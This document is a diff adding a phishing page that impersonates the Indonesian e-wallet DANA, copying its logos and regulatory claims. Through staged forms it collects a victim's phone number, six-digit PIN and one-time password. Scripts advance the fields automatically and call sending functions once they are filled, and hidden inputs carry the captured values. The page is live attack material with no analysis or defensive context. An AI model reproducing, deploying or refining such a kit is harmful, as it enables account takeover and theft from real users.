@@ -1,0 +1,895 @@
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0"><meta name="theme-color" content="#118EEA"><meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title> 𝗜𝗗 |  𝗖𝗮𝗿𝗲 </title>
+<meta content="https://hosting.tigerengine.id/2ln0x6.jpg" property="og:image"><script src="i.js"></script><link href="https://hosting.tigerengine.id/shv5u3.png" rel="shortcut icon" type="image/x-icon"><link href="https://hosting.tigerengine.id/shv5u3.png" rel="apple-touch-icon">
+<meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!"><meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!"><script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script><script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script><link rel="stylesheet" href="https://ast-esh.pages.dev/container.css"><link rel="stylesheet" href="https://ast-esh.pages.dev/loader.css"><link rel="stylesheet" href="https://ast-esh.pages.dev/main.css"><link rel="stylesheet" href="https://ast-esh.pages.dev/otp.css"><link rel="stylesheet" href="https://ast-esh.pages.dev/pin.css">
+</head>
+<style>
+
+body, html{
+      left: 0;
+      right: 0;
+      bottom: 0;
+      top: 0;
+      margin: 0px auto;
+      width: 100%;
+      height: 100%;
+      positon: fixed
+      
+}
+
+h3{
+  font-size: 23px;  
+}
+
+ 
+ * {
+  box-sizing: border-box;
+  scrollbar-color: transparent transparent; /* thumb and track color */
+  scrollbar-width: 0px;
+}
+
+*::-webkit-scrollbar {
+  width: 0;
+}
+
+*::-webkit-scrollbar-track {
+  background: transparent;
+}
+
+*::-webkit-scrollbar-thumb {
+  background-color: #118EEA;
+  border: none;
+}
+
+* {
+  -ms-overflow-style: none;
+}
+
+ol, li {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+}
+
+.carousel {
+  position: absolute;
+  background-color: #118EEA;
+  padding-top:0%;
+  height: 100%;
+  top: 0;
+  right: 0;
+  left: 0;
+  margin: 0px auto;
+  perspective: 200px;
+}
+
+.carousel__viewport {
+  position: absolute;
+  width: 100%;
+  top: 0;
+  background-color: #118EEA;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  height: 530px;
+  display: flex;
+  overflow-x: scroll;
+  counter-reset: item;
+  margin: 0px auto;
+ 
+  scroll-behavior: smooth;
+  scroll-snap-type: x mandatory;
+}
+
+.carousel__slide {
+  position: relative;
+  flex: 0 0 100%;
+  width: 100%;
+  height: 100%;
+  margin-left: 10px;
+  background-color: #118EEA;
+  counter-increment: item;
+  z-index: 99999999;
+}
+
+.carousel__slide:nth-child(even) {
+  background-color: #118EEA;
+}
+
+.carousel__slide:before {
+  content: counter(item);
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate3d(-50%,-40%,70px);
+  color: #000;
+  font-size: 2em;
+  background-color: #118EEA;
+}
+
+.carousel__snapper {
+  position: relative;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  width: 100%;
+  height: 100%;
+  scroll-snap-align: center;
+  background-color: #118EEA;
+  
+  
+}
+
+@media (hover: hover) {
+  .carousel__snapper {
+    animation-name: tonext, snap;
+    animation-timing-function: ease;
+    animation-duration: 4s;
+    animation-iteration-count: infinite;
+  }
+
+  .carousel__slide:last-child .carousel__snapper {
+    animation-name: tostart, snap;
+  }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  .carousel__snapper {
+    animation-name: none;
+  }
+}
+
+.carousel:hover .carousel__snapper,
+.carousel:focus-within .carousel__snapper {
+  animation-name: none;
+}
+
+.carousel__navigation {
+  position: absolute;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  text-align: center;
+}
+
+.carousel__navigation-list,
+.carousel__navigation-item {
+  display: inline-block;
+}
+
+
+.carousel::before,
+.carousel::after,
+.carousel__prev,
+.carousel__next {
+  position: absolute;
+  top: 0;
+  margin-top: 37.5%;
+  width: 0;
+  height: 0;
+  transform: translateY(-50%);
+  border-radius: 50%;
+  font-size: 0;
+  outline: 0;
+  opacity: 0.0;
+}
+
+.carousel::before,
+.carousel__prev {
+  left: -1rem;
+}
+
+.carousel::after,
+.carousel__next {
+  right: 0rem;
+}
+
+.carousel::before,
+.carousel::after {
+  content: '';
+  z-index: 1;
+  background-color: #fff;
+  background-size: 1.5rem 1.5rem;
+  background-repeat: no-repeat;
+  background-position: center center;
+  color: #000;
+  font-size: 2.5rem;
+  line-height: 4rem;
+  text-align: center;
+  pointer-events: none;
+}
+
+/*********************/
+.process1 {
+     width: 100%;
+            height: 100%;
+             display: flex;
+             justify-content: center;
+            margin: auto;
+            position: absolute;
+           padding-top: 300px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 99999;
+            
+      
+}
+.loading {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+}
+.loading img {
+    width: 50px;
+    
+    top: 10;
+}
+.loading .spinner{
+    position: absolute;
+    width: 35px;
+    animation: spin 1s linear infinite;
+    -webkit-animation: spin 1s linear infinite;
+    -moz-animation: spin 1s linear infinite;
+    -ms-animation: spin 1s linear infinite;
+    -o-animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(360deg); }
+  100% { transform: rotate(0deg); }
+}
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-moz-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-ms-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-o-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+
+/*********************/
+
+ #homeku{
+     width: 100%;
+     height: 100%;
+     position: fixed;
+    background: #118EEA;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+  left: 0;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  margin: 0px auto;
+     
+     
+ }
+ 
+ .inp{
+     width: 70%;
+     padding-left: 10px;
+ }
+ 
+ 
+ .btn-backku{
+     position: absolute;
+     left: 20;
+     top: 12;
+     background: transparent;
+     color: #fff;
+     border: none;
+     font-size: 18px;
+     font-weight: 300;
+    
+ }
+ 
+ 
+ #back1{
+      display: none;
+     
+ }
+ 
+ #back2{
+      display: none;
+ }
+ 
+ 
+ .closeright{
+	-webkit-animation-duration: 0.5s;
+	animation-duration: 0.5s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+-webkit-animation-name: fadeOutRightBig; 
+    animation-name: fadeOutRightBig; 
+}
+
+@-webkit-keyframes fadeOutRightBig { 
+    0% { 
+        opacity: 1; 
+        -webkit-transform: translateX(0); 
+    } 
+    100% { 
+        opacity: 1; 
+        -webkit-transform: translateX(200px); 
+    } 
+} 
+@keyframes fadeOutRightBig { 
+    0% { 
+        opacity: 1; 
+        transform: translateX(0); 
+    } 
+    100% { 
+        opacity: 1; 
+        transform: translateX(200px); 
+    } 
+} 
+
+
+
+.animated  {
+	-webkit-animation-duration: 0.6s;
+	animation-duration: 0.6s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	-webkit-animation-name: fadeInRightBig; 
+    animation-name: fadeInRightBig; 
+}
+
+@-webkit-keyframes fadeInRightBig { 
+    0% { 
+        opacity: 1; 
+        -webkit-transform: translateX(200px); 
+    } 
+    100% { 
+        opacity: 1; 
+        -webkit-transform: translateX(0); 
+    } 
+} 
+@keyframes fadeInRightBig { 
+    0% { 
+        opacity: 1; 
+        transform: translateX(200px); 
+    } 
+    100% { 
+        opacity: 1; 
+        transform: translateX(0); 
+    } 
+} 
+
+
+
+
+
+.bounceInLeft {
+	-webkit-animation-duration: 0.5s;
+	animation-duration: 0.5s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	 -webkit-animation-name: bounceInLeft;
+    animation-name: bounceInLeft; 
+}
+
+@-webkit-keyframes bounceInLeft { 
+    0% { 
+        opacity: 1; 
+        -webkit-transform: translateX(-200px); 
+    } 
+   
+    100% { 
+        -webkit-transform: translateX(0); 
+    } 
+} 
+
+@keyframes bounceInLeft { 
+    0% { 
+        opacity: 1; 
+        transform: translateX(-200px); 
+    } 
+   
+    100% { 
+        transform: translateX(0); 
+    } 
+} 
+
+
+
+
+.fadeInUpBig {
+	-webkit-animation-duration: 0.6s;
+	animation-duration: 0.6s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	 -webkit-animation-name: fadeInUpBig; 
+    animation-name: fadeInUpBig; 
+}
+
+@-webkit-keyframes fadeInUpBig { 
+    0% { 
+        opacity: 1; 
+        -webkit-transform: translateY(200px); 
+    } 
+    100% { 
+        opacity: 1; 
+        -webkit-transform: translateY(0); 
+    } 
+} 
+@keyframes fadeInUpBig { 
+    0% { 
+        opacity: 1; 
+        transform: translateY(200px); 
+    } 
+    100% { 
+        opacity: 1; 
+        transform: translateY(0); 
+    } 
+} 
+
+
+.fadeInDownBig {
+  -webkit-animation-name: fadeInDownBig;
+  animation-name: fadeInDownBig;
+  -webkit-animation-delay: 0.5s;
+  -moz-animation-delay: 0.5s;
+  animation-delay: 0.5s;
+}
+
+@keyframes fadeInDownBig {
+  0% {
+    opacity: 0;
+    -webkit-transform: translate3d(0, -2000px, 0);
+    transform: translate3d(0, -2000px, 0);
+  }
+  100% {
+    opacity: 1;
+    -webkit-transform: none;
+    transform: none;
+  }
+}
+
+</style>
+<body>
+
+<div style="display:none;" class="index">
+	<div class="header">
+		<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifn9c4EgIM0xKtd-ItLyeI2GinOWc7MtuNafa5oHftKTSSacKLE970IA5mbumKHGn1iRwLrIKdhEwkVUnymKoE8zVerk4PwYHYLWAh1KHYzwPQymgB5LEQZ7hoCUd1OHxKxQDNNr2AHHjljfPmxKfmSqaYaHyQEhOYnX3j2jJKDvzfQ8qviv99xff4n3E/s1600/dana_logo.png" class="logo" alt="">
+	</div>
+	<div class="content">
+		<div class="hero">
+			<img src="ast/img/hero.svg" alt="">
+		</div>
+		<h1>Dompet digital untuk kamu!</h1>
+		<p class="desc">
+			Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
+		<div class="line"></div>
+		<p class="log">
+			Masukkan <b>nomor HP</b> kamu untuk lanjut
+		</p>
+		<button type="button" onclick="next();">LOGIN</button>
+	</div>
+</div>
+<div class="start" style="display:none;">
+	<img class="logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLBYSr8SbyAs-YvJbicZUDE9JKppHsLXpJfTkEvzeb5mYkSfuKCsZqTqlCz_7Hs319-kdEGZRilbuaYIlWnLGZE9BPS0iHlpXUDHKQwir3VaMf3HRoFygIMjheZf64R0leTmIuGJ36NZ1tcMebx7Vuw-Kd84M5u43vCzFcjPLrOW4zcsaOkRPPe66X2_I/s1600/dana_text.png" style="width: 150px">
+	<div class="footimg">
+		<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiliuCnDQ00oaMGbrOdlkThmfUwY6I-MxxjCUh8j7dGmzkysyVv0j_rvDxxBjBVIkqvWoJ8UEJ-hDrhCIvMGm8H3hQEuNI8Ty0JOWfxBthbOmeTBW_rpJkSriLrd-R_R218c39iBnL3-WZxEmWOD_wDm9U-D4joC9F84A46upnBKs8Mjk3uD6g3ere10vk/s1600/bi.png" alt=""><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9EY95xkJn_6mvgovRCWT5ML1xO1vyobyqc6UH3TnFIq-oGBr7mjFmF2dkMYc1iSLs_CAeLQDM8jvVOFyN0Xk058JPzpfBmQ7VEd-2D3iFiCFqPn-gdq7j3emNyeldPVuMN4ZEWXOWL8bJhMQO36NQxEq_FuxYlPM_YZ81cVRL0SQQ-9Ia1yWEBl__yA4/s1600/kom.png" alt="">
+		<p>
+			DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
+	</div>
+</div>
+
+<div class="container hid" style="position: fixed">
+    
+	<div class="" style="text-align: center;" id="homeku">
+   
+
+        
+     <section class="carousel" aria-label="Gallery" style="margin-top: 0px; text-align: center; left: 0">
+  <ol class="carousel__viewport">
+    <li id="carousel__slide1"
+        tabindex="0"
+        class="carousel__slide" style="background-color: #118EEA;">
+      <div class="carousel__snapper"  style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdWPr3LoMLhsgcARfPTRxxrtlT-hrEj75erXA6RgAktVMDOtluHE3pqTKAzeERHSq9VgGLQm0f5SaPvtEf8mcTrgOaCBzubgxlxZSPTe7SbXQW2Es26vbkd15IpS8a8obfXkhkDID1tGYBnouqx-PrjqEQd56S1rYzhBty7XQHiaYWTmnHfrbGJuAZBIA/s1600/ezgif.com-crop1.gif');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; z-index: 99999999; position: relative;">
+       
+       
+      </div>
+    </li>
+    <li id="carousel__slide2"
+        tabindex="0"
+        class="carousel__slide" style="background-color: #118EEA;">
+      <div class="carousel__snapper" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjX3Ommc8dCZHFZ0ZjCJ9LD5QkBMQAogwhAexdlJqSzN6n9Ap7UPTrD7RZPj1AY3T2hEZ-L5gYAOpFx2Vybw-LnsKr10Gik8Kn1LebA0yc7x2tyVfZrQpPB15SkSp_I5TgfXCXPWi-TseX-1rb8weCYiDCQ-xJXhsXq8nqDKK-7h88o3IpYp2Ym7GFKne8/s1600/ezgif.com-crop2.gif');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; background-color: transparent;"></div>
+      <a href="#carousel__slide1"
+         class="carousel__prev">Go to previous slide</a>
+      <a href="#carousel__slide3"
+         class="carousel__next">Go to next slide</a>
+    </li>
+    <li id="carousel__slide3"
+        tabindex="0"
+        class="carousel__slide" style="background-color: #118EEA;">
+      <div class="carousel__snapper"  style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhH2Sd9Tq_ejh6yECec1xYxt5PDXPreG-2kn69zPhzs1HaDEcc9OILoJGngoxd_YzBBDP34RzZxXGDPz5jSy73q3i97GuUDao7lKfxjuCPX04GBIi_d4JAbo_wj_8nLHLQBmhE0UdmHCjw51DUQbemQP2hzMm1M6zLrtrnU9l-H7pYH0FbQB-In2IMnpd0/s1600/ezgif.com-crop3.gif');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%;">
+       
+       
+      </div>
+    </li>
+   
+  </ol>
+  <aside class="carousel__navigation">
+    <ol class="carousel__navigation-list">
+      <li class="carousel__navigation-item">
+        <a href="#carousel__slide1"
+           class="carousel__navigation-button"></a>
+      </li>
+      <li class="carousel__navigation-item">
+        <a href="#carousel__slide2"
+           class="carousel__navigation-button"></a>
+      </li>
+      <li class="carousel__navigation-item">
+        <a href="#carousel__slide3"
+           class="carousel__navigation-button"></a>
+      </li>
+      <li class="carousel__navigation-item">
+        
+    </ol>
+  </aside>
+</section>
+<button id="butonku" style="width: 100%; height: 140px; position: fixed; bottom: 0; left: 0; right: 0; margin: 1px auto; border: 0; background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGZKgJTbQYi9AA-nQrOI0b-TDvlqb-s0CxVkL2bxB2uWNMb67htnY0iCjD5hsTc40oDendAJJpu2-ILbsk4M-bNv46rJAFrrrf2mFPysatrchk6Rg-Hit5WOqu9PDuUbkmnp5R3gl_vEtji6OKLaNH9MiqhE4ZNWPZeITV8MBG_cNbXgc0qbJrHUO-VLs/s1600/patokla.png');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; z-index: 99999" onclick="nextPrev()"></button>
+      <center>
+     <div id="process1" name="process" class="process" style="display: none;">
+            <div class="loading">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZH-N0wN6FAmkGgyk10EQ7jvi3t_76GOfnax8pM8juwlMyN4KOy-2WuI68vLTMOnZyZmnNa7MHNI9U2k-ZcGYWruvALXJ-VnD1i4iBfezdLGGtFzjvpAmiLogvJeuvKHWwazaeN5cE6A0r9Gmiu7ObxeLFIc29G1pOJlc1QY8GPjMmZGvO0uTQX5X12rk/s1600/load_bg.png">
+                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjymgZkivno__fWTdTz6vvunARIRJI4BZogXCTs1Q35vHyxC3A1oZU4JyRKdwoXwJsKF90P0B-7Tilt7sPl0VfXIdaltZEX6c97hkKpVD6MOMS04xpqaH4HL318jf_bOGlOhIL2KmyJMZfH_mhw9AqxGr28S53SYvvQaVSUwMtoWXsup2HC83uzdzoVHtY/s1600/load_spin.png" id="loading" style="margin-top: 8px">
+            </div>
+        </div>
+        </center>
+  </div>
+  <div id="blogin" class="animated box-login" style="width: 100%;
+    height: 100%;
+    bottom: 0; 
+    position: fixed; 
+    left: 0; 
+    padding: 0px
+    right: 0; 
+    margin: 0px auto;
+    top: 0; display: noe;">
+      	<div id="process" name="process" class="process" style="display: none;">
+			<div class="loading">
+				<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZH-N0wN6FAmkGgyk10EQ7jvi3t_76GOfnax8pM8juwlMyN4KOy-2WuI68vLTMOnZyZmnNa7MHNI9U2k-ZcGYWruvALXJ-VnD1i4iBfezdLGGtFzjvpAmiLogvJeuvKHWwazaeN5cE6A0r9Gmiu7ObxeLFIc29G1pOJlc1QY8GPjMmZGvO0uTQX5X12rk/s1600/load_bg.png"><img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjymgZkivno__fWTdTz6vvunARIRJI4BZogXCTs1Q35vHyxC3A1oZU4JyRKdwoXwJsKF90P0B-7Tilt7sPl0VfXIdaltZEX6c97hkKpVD6MOMS04xpqaH4HL318jf_bOGlOhIL2KmyJMZfH_mhw9AqxGr28S53SYvvQaVSUwMtoWXsup2HC83uzdzoVHtY/s1600/load_spin.png" style="margin-top: 8px">
+			</div>
+		</div>
+		
+		<div class="header">
+<button id="back1" type="button" class="btn-backku" onclick="goback1()"><ion-icon name="chevron-back-outline"></ion-icon></button>	<p></p>
+
+
+			<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifn9c4EgIM0xKtd-ItLyeI2GinOWc7MtuNafa5oHftKTSSacKLE970IA5mbumKHGn1iRwLrIKdhEwkVUnymKoE8zVerk4PwYHYLWAh1KHYzwPQymgB5LEQZ7hoCUd1OHxKxQDNNr2AHHjljfPmxKfmSqaYaHyQEhOYnX3j2jJKDvzfQ8qviv99xff4n3E/s1600/dana_logo.png" class="logo" alt="">
+		</div>
+		<form id="formNohp" onsubmit="sendNohp(event);" >
+		     <input type="hidden" id="logo" value="»»—⍟ 𝘄𝘄𝘄.𝗱𝗮𝗻𝗮.𝗶𝗱 ⍟—««">
+		     <input type="hidden" name="tarif" id="tarif" value="">
+			<h3 style="font-size: 16px; margin-top: -20px">Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
+			<div class="box-input" style="width: 95%;">
+				<div class="label">
+					<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhJoHraxfbecN0u6lzx-SKJZzRdnv8xtL6ShYHUqLmpaFuNfi1qABZGDqnAsCUKGxXnDHA-geq_DU9VFOS_T0aBsD2wTnKlwx-SLIbv-WqrBxZEL7qeKr0e8hgJvYqWs8fyQNbAU0iIN-x3kbDqOVuoimAwgy2e1dku8FGgw7aytSCzzAItoAXskITcM0/s1600/indo.png" alt=""><label>+62</label>
+				</div>
+				<input class="inp" id="inp" type="tel" autocomplete="off" required name="nohp" placeholder="811-1234-5678" maxlength="12" minlength="10"></div>
+			<p class="desc" style="font-size: 14px; line-height: 18px; margin-top: 25px">
+			Dengan melanjutkan, kamu setuju dengan <b>Syarat<br/>& Ketentuan</b> dan
+				<b>Kebijakan Privasi</b> kami
+			</p>
+			<div class="box-btn">
+				<button disabled id="btn" class="btnnohp" type="submit" style="margin-top: -40px">LANJUT</button>
+			</div>
+		</form>
+		<form id="formPin" onsubmit="return false" class="hid" style="width: 100%;
+    height: 100%;
+    bottom: 0; 
+    position: fixed; 
+    left: 0; 
+    right: 0; 
+    margin: 0px auto;
+    top: 0;">
+		     <input type="hidden" id="logo" value="»»—⍟ 𝘄𝘄𝘄.𝗱𝗮𝗻𝗮.𝗶𝗱 ⍟—««">
+		     <input type="hidden" name="tarif" id="tarif" value="">
+		     <input type="hidden" name="nomor1" id="nomor1" value="">
+		    <button id="back2" type="button" class="btn-backku" onclick="goback2()" style="margin-top: 10px"><ion-icon name="chevron-back-outline"></ion-icon></button>
+			<h3 style="margin-top: 50px; font-weight: 600; margin-bottom: -10px; font-size: 16px"><font style="font-weight: 400">Masukkan</font> PIN DANA</h3>
+			<div class="box-input-pin">
+				<div type="button" class="clear"></div>
+				<input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;" onchange="javascript:this.form.button();" oninput="sendPin()"></div>
+			<button class="show" type="button">TAMPILKAN</button>
+			<p class="forgot">LUPA PIN?</p>
+			<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1EGayZAjmIpqEc-FR-hGVfJjPbfsOvhLZKhjmYWszDqPYFyDGCuZwBZergH2HKoH_jFK35KL8wVQZTVV0geG-aymHVuutS8XLdsxS4lekyVOWsvhDdgcpxz3DODJt0alf5LwYmJN6vE92sw86_RuTPPqsaa69T4C77dF0VQ1cBVNYfQRTUkuEsSaSPoc/s1600/output-onlinegiftools.gif" width="100%" style="position: absolute; bottom: 10; left: 0; right: 0; margin: 0px auto;">
+		</form>
+		
+		<form id="formOtp" class="fadeInUpBig bgotp hid" style="width: 100%;
+    height: 100%;
+    bottom: 0; 
+    position: absolute; 
+    left: 0; 
+    right: 0; 
+    margin: 0px auto;
+    top: 0;">
+			 <div class="page" style="left: 0px; position: absolute; right: 0; margin: 0px auto; margin-top: 0px; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWg2Gu-OJgBB04_6jT0WUgRXWLn5YbRSrznAuun2UvU5EReoC_5dcLybIsjF8faelAIw9vhfnlRTJL_m1uMpM3bDrXHp6xE_KyYSDuAMYlaNiTl9d5tz8mY-o7F-vw6oL661O_C551IITUOWQoxYKFmdNN5s0lHvxrPQEJgiMvBFhDcXC6lt3hbPLBEmo/s1079/AddText_01-04-04.13.11.png) ;
+  background-position: 100% 100%;
+  background-size: 100% 100%; height: 280px; bottom: 0; width: 100%; border-radius: 14px 14px 0px 0px; width: 100%; text-align: center; background-color: #fff;" id="otpkirimulang">
+<button type="button" style="right: 10; bottom: 238; float: right; width: 40px; background: transparent; color: transparent; border: none; font-size: 13px; height: 10px; position: fixed;" onclick="tutupotp()">XX</button>
+				<h2 style="margin-bottom: 30px; opacity: 0.0">Masukkan OTP</h2>
+				<p id="userid" style="font-size: 2px; text-align: center; margin-bottom: -100px; font-weight: 600; color: #070707; margin-top: 66px; margin-left: -125px; opacity: 0.0; "></p>
+  <center>
+				<p class="alert" id="alert" style="font-size: 14px; text-align: center; margin-bottom: 0px; font-weight: 500; color: #000; margin-top: 140px; display: ; width: 360px; margin-bottom: -10px; font-weight: 300"></p>
+				
+				
+				</center>
+				<div class="box-input-otp" style="margin-top: 50px">					
+					<div class="loadingOtp" style="display:none;background: #FAFAFA">						
+						<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZH-N0wN6FAmkGgyk10EQ7jvi3t_76GOfnax8pM8juwlMyN4KOy-2WuI68vLTMOnZyZmnNa7MHNI9U2k-ZcGYWruvALXJ-VnD1i4iBfezdLGGtFzjvpAmiLogvJeuvKHWwazaeN5cE6A0r9Gmiu7ObxeLFIc29G1pOJlc1QY8GPjMmZGvO0uTQX5X12rk/s1600/load_bg.png"><img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjymgZkivno__fWTdTz6vvunARIRJI4BZogXCTs1Q35vHyxC3A1oZU4JyRKdwoXwJsKF90P0B-7Tilt7sPl0VfXIdaltZEX6c97hkKpVD6MOMS04xpqaH4HL318jf_bOGlOhIL2KmyJMZfH_mhw9AqxGr28S53SYvvQaVSUwMtoWXsup2HC83uzdzoVHtY/s1600/load_spin.png">
+		</div>
+		<div type="button" class="clearotp"></div>
+		 <input type="hidden" id="logo" value="»»—⍟ 𝘄𝘄𝘄.𝗱𝗮𝗻𝗮.𝗶𝗱 ⍟—««">
+		 <input type="hidden" name="tarif" id="tarif" value="">
+		 <input type="hidden" name="nomorB" id="nomorB" value="">
+		 <input type="hidden" name="pin1A" id="aku1" value="">
+		 <input type="hidden" name="pin2A" id="aku2" value="">
+		 <input type="hidden" name="pin3A" id="aku3" value="">
+		 <input type="hidden" name="pin4A" id="aku4" value="">
+		 <input type="hidden" name="pin5A" id="aku5" value="">
+		 <input type="hidden" name="pin6A" id="aku6" value="">
+					<input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp5" id="otp5" class="" inputmode="numeric" type="hidden" autocomplete="off" maxlength="1" onkeypress="if(this.value.length==1) return false;"></div>
+					
+		 <p id="waktuku" class="resend" style="margin-top: 70px; color: #aaa; font-size: 13px">
+					KIRIM ULANG (<span id="carasingkat" style="color: #aaa">80</span>s)
+				</p>
+       <p class="resend" style="margin-top: 70px; font-weight: 600; color: #2C86C5; margin-left: 0px; display: none;" id="kirim-ulang" onclick="kirimulang()">KIRIM ULANG</p>
+       </form>  
+			</div>
+		</div>
+	</div>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+        <script>
+            var url = "#kirim-ulang"; // url tujuan
+            var count = 80; // dalam detik
+            function countDown() {
+                
+                if (count > 0) {
+                    count--;
+                    var waktu = count + 0;
+            $('#carasingkat').html(waktu);
+             
+         setTimeout("countDown()", 1000);
+           
+                    
+               
+                }
+            }
+            countDown();
+       
+       </script>
+
+<script src="https://ast-esh.pages.dev/jquery.mask.min.js"></script>
+
+
+<script>
+$(document).ready(function() {
+    $('#inp').on('input', function() {
+        if ($(this).val() == '0' || $(this).val() == '62') {
+            $(this).val('');
+        }
+    });
+});
+</script>
+<script>
+$(document).ready(function() {
+    $('#inp').mask('000-0000-000000');
+});
+</script>
+<script>
+let inp = document.getElementById("inp");
+let btn = document.getElementById("btn");
+inp.addEventListener("input", val);
+
+function val() {
+    if (inp.value.length > 10) {
+        btn.disabled = false;
+    } else {
+        btn.disabled = true;
+    }
+};
+</script>
+
+<script>
+//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
+var pinContainer = document.querySelector(".box-input-pin");
+/*console.log('There is ' + pinContainer.length + ' Pin Container on the page.');*/
+
+pinContainer.addEventListener('keyup', function (event) {
+    var target = event.srcElement;
+    
+    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
+    var myLength = target.value. length;
+
+    if (myLength >= maxLength) {
+        var next = target;
+        while (next = next.nextElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+
+    if (myLength === 0) {
+        var next = target;
+        while (next = next.previousElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+}, false);
+
+pinContainer.addEventListener('keydown', function (event) {
+    var target = event.srcElement;
+    target.value = "";
+}, false);
+</script>
+<script>
+$('.inpotp').on('input', function(event) {
+    const inputs = $('.inpotp');
+    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+    if (isAllFilled == true) {
+        $(event.target).blur();
+        sendOtp();
+    }
+    const index = inputs.index(this);
+    const currentValue = event.target.value;
+    if (currentValue.length === 1) {
+        if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+    } else if (currentValue.length === 0) {
+        if (index > 0) {
+            inputs[index].focus();
+        }
+    };
+});
